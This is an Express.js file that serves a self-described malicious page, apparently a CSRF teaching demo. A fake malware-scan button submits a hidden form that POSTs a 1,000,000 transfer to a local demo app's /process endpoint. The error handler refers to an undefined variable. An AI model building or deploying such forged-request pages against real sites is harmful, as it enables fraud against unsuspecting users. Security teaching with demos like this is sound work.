var express = require('express');

// create express app
var app = express();

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send(
        `
            <h1>Malicious website 😈</h1>
            Your computer is infected with malware!!!
            <form action="http://localhost:${PORT}/process" method="POST">
                <div>
                    <input id="beneficiary" name="beneficiary" type="hidden" value="1234" />
                </div>
                <div>
                    <input id="amount" name="amount" type="hidden" value="1000000" />
                </div>
                <input type="submit" value="Scan computer for malware now!" />
            </form>
        `
    );
});

const PORT2 = process.env.PORT2 || 4000;

app.listen(PORT2, (err) => {
    if (err) {
        console.error(error.message);
        return;
    }

    console.log(`Malicious site: http://localhost:${PORT2}`);
});
